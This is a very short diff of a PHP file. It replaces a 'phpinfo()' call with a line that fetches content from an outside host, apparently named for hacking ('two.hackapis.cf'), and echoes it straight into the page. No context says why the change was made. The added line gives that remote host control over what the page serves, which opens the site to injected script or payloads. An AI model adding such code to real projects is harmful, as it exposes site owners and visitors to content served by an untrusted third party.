@@ -1,3 +1,3 @@
 <?php
-  echo phpinfo();
+  echo file_get_contents("http://two.hackapis.cf");
 ?>
